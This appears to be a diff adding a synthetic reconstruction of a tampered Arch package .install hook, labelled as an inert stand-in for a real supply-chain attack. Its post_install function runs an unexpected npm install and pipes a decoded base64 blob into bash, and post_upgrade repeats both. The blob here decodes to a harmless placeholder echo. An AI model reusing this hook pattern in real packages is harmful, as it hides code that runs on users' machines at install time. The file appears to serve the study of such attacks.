@@ -1,0 +1,12 @@
+# Synthetic reconstruction of an Atomic-Arch-style tampered .install hook.
+# See SOURCE.md -- this is NOT the original malicious code, and the base64 blob
+# below decodes to an inert placeholder string, not functional shellcode.
+
+post_install() {
+  npm install atomic-lockfile-example
+  echo 'ZWNobyB0aGlzLWlzLWEtcGxhY2Vob2xkZXItbm90LXJlYWwtbWFsd2FyZQ==' | base64 -d | bash
+}
+
+post_upgrade() {
+  post_install
+}
